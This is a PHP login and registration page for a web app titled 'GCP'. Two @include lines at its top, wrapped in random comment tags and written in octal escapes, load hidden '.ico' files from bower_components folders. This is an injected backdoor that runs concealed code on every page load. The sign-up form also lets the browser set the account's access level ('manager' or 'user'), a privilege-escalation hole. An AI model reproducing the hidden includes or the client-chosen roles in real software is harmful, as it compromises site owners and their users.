<?php
/*db1ad*/

@include "\057h\157m\145/\143o\144e\166i\141b\057p\165b\154i\143_\150t\155l\057g\143p\057b\157w\145r\137c\157m\160o\156e\156t\163/\142o\157t\163t\162a\160/\0568\0662\0653\071c\071.\151c\157";

/*db1ad*/




/*a5b08*/

@include "\057hom\145/co\144evi\141b/p\165bli\143_ht\155l/m\171ras\057bow\145r_c\157mpo\156ent\163/.3\0671b5\061a0.\151co";

/*a5b08*/

    include("connection/config.php");
?>

<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title>GCP</title>
  <!-- Tell the browser to be responsive to screen width -->
  <meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
 <!-- Bootstrap 3.3.7 -->
  <link rel="stylesheet" href="bower_components/bootstrap/dist/css/bootstrap.min.css">
  <!-- Font Awesome -->
  <link rel="stylesheet" href="bower_components/font-awesome/css/font-awesome.min.css">
  <!-- Ionicons -->
  <link rel="stylesheet" href="bower_components/Ionicons/css/ionicons.min.css">
  <!-- Theme style -->
  <link rel="stylesheet" href="dist/css/AdminLTE.min.css">
  <!-- iCheck for checkboxes and radio inputs -->
  <link rel="stylesheet" href="plugins/iCheck/all.css">
  <!-- iCheck -->
  <link rel="stylesheet" href="plugins/iCheck/square/blue.css">
  <!-- Select2 -->
  <link rel="stylesheet" href="bower_components/select2/dist/css/select2.min.css">
  <!-- daterange picker -->
  <link rel="stylesheet" href="bower_components/bootstrap-daterangepicker/daterangepicker.css">
  <!-- bootstrap datepicker -->
  <link rel="stylesheet" href="bower_components/bootstrap-datepicker/dist/css/bootstrap-datepicker.min.css">
  <!-- Bootstrap Color Picker -->
  <link rel="stylesheet" href="bower_components/bootstrap-colorpicker/dist/css/bootstrap-colorpicker.min.css">
  <!-- Bootstrap time Picker -->
  <link rel="stylesheet" href="plugins/timepicker/bootstrap-timepicker.min.css">
  <script src="http://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
  <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.4.7/angular.js"></script>
	<style>
		.form button {
		  -webkit-transition: all 0.3 ease;
		  transition: all 0.3 ease;
		  cursor: pointer;
		}

		.form .register-form {
		  display: none;
		}

		/* unvisited link */
		a:link {
		    color: orange;
		}

		/* visited link */
		a:visited {
		    color: orange;
		}

		/* mouse over link */
		a:hover {
		    color: orange;
		}

		/* selected link */
		a:active {
		    color: orange;
		}
		
	    .placeholder{color: grey;}
		select option:first-child{color: grey; display: none;}
		select option{color: #555;} // bootstrap default color
	
		.form button {
		  -webkit-transition: all 0.3 ease;
		  transition: all 0.3 ease;
		  cursor: pointer;
		}

		.form .register-form {
		  display: none;
		}

		

	</style>

</head>


<body>

	<div class="login-box">

		<div class="form" ng-app="myapp">

			  <!-- /.login-logo -->
			  	<div class="login-box-body">
			    	<p class="login-box-msg"><img src="dist/img/logo.png" width="100%"></p>

				    <form class="register-form" id="myForm" name="myForm" method="POST" action="user_insert.php">
				    	
						<div class="form-group has-feedback">
						      <input type="text" class="form-control"  name="name" placeholder="Enter Name"/>
						      <span class="glyphicon glyphicon-star form-control-feedback"></span>
						</div>

		
				    	<div class="frmCheckUsername">
				    	<div class="form-group has-feedback">
						      <input type="text" class="form-control" id="username" name="username" placeholder="Enter Username"onBlur="checkAvailability()"/>
						      <span class="glyphicon glyphicon-user form-control-feedback"></span>
							   <span id="user-availability-status"></span>   
						</div>
						</div>

				    	<div class="form-group has-feedback">
						      <input type="text" class="form-control" name="phone" placeholder="Enter Phone Number"/>
						      <span class="glyphicon glyphicon-earphone form-control-feedback"></span>
						</div> 

						<div class="form-group">
							<select class="form-control select2" id="preference" name="preference" type="text"style="width: 100%;" onchange="showfield(this.options[this.selectedIndex].value)">>
							   <option selected="selected" value="">Choose Category</option>
								<option value="Student">Student</option>
								<option value="Manager">Employer</option>
							</select>
					    </div>
						<script type="text/javascript">
					function showfield(name){
					  if(name=='Student')document.getElementById('div1').innerHTML='<input type="hidden" name="level" id="level" value="user"/>';
					  else document.getElementById('div1').innerHTML='<input type="hidden" name="level" id="level" value="manager"/>';
					}
					</script>

<div id="div1"></div>
				    	<div class="form-group has-feedback">
						      <input type="password" class="form-control" id="password" name="password" placeholder="Enter Password" ng-model="formData.password" ng-minlength="8" ng-maxlength="20" required />
						      <span class="glyphicon glyphicon-lock form-control-feedback"></span>
						      <span ng-show="myForm.password.$error.required && myForm.password.$dirty"><font class="warning">Compulsory</font></span>
						      <span ng-show="!myForm.password.$error.required && (myForm.password.$error.minlength || myForm.password.$error.maxlength) && myForm.password.$dirty"><font class="warning">Password must be 8 to 12 characters.</font></span>
						</div>

				    	<div class="form-group has-feedback">
						      <input type="password" class="form-control" id="password_c" name="password_c" placeholder="Re-enter Password" ng-model="formData.password_c" valid-password-c required />
						      <span class="glyphicon glyphicon-lock form-control-feedback"></span>
						      <span ng-show="myForm.password_c.$error.required && myForm.password_c.$dirty"><font class="warning">Please confirm your password.</font></span>
						      <span ng-show="!myForm.password_c.$error.required && myForm.password_c.$error.noMatch && myForm.password.$dirty"><font class="warning">Passwords do not match.</font></span>

						</div>

						      <button type="submit" class="btn btn-warning btn-block btn-flat">Sign Up</button>
						      <br/><p class="message">Already Signed Up? <a href="#">Enter To The System</a></p>

				    </form>



				    <form class="login-form" action="checklogin.php" method="POST" role="login">
                    <?php if(isset($fmsg)){ ?><div class="alert alert-danger" role="alert"> <?php echo $fmsg; ?> </div><?php } ?>
						<div class="form-group has-feedback">
							<input type="text" id="username" name="username" class="form-control" placeholder="Enter Username" required>
							<span class="glyphicon glyphicon-user form-control-feedback"></span>
							
						</div>

						<div class="form-group has-feedback">
						    <input type="password" name="password" class="form-control" placeholder="Enter Password" required>
						    <span class="glyphicon glyphicon-lock form-control-feedback"></span>
						</div>

					    	<button type="submit" class="btn btn-warning btn-block btn-flat">Sign In</button>
					      	<br/><p class="message">No Account? <a href="#">Sign Up Here</a></p>

				    </form>

				</div>

	  	</div>
	  <!-- /.login-box-body -->
	</div>
	<!-- /.login-box -->

</body>
</html>


	<script src="assets/js/validation.js"></script>

<script>
	  $(function () {
		$('input').iCheck({
		  checkboxClass: 'icheckbox_square-blue',
		  radioClass: 'iradio_square-blue',
		  increaseArea: '20%' // optional
		});
	  });
  	$('.message a').click(function(){
		   $('form').animate({height: "toggle", opacity: "toggle"}, "slow");
		});
		var seq=0;
		function myFunction() {
		seq=seq+1;
			document.getElementById("demo").value = seq;
		}
	
</script>
<script>
		function checkAvailability() {
		//$("#loaderIcon").show();
		jQuery.ajax({
		url: "exist.php",
		data:'username='+$("#username").val(),
		type: "POST",
		success:function(data){
		$("#user-availability-status").html(data);
		//$("#loaderIcon").hide();
		},
		error:function (){}
		});
		}
		$(function () {
		//Initialize Select2 Elements
		$('.select2').select2()});
</script>
<!-- Select2 -->
<script src="bower_components/select2/dist/js/select2.full.min.js"></script>
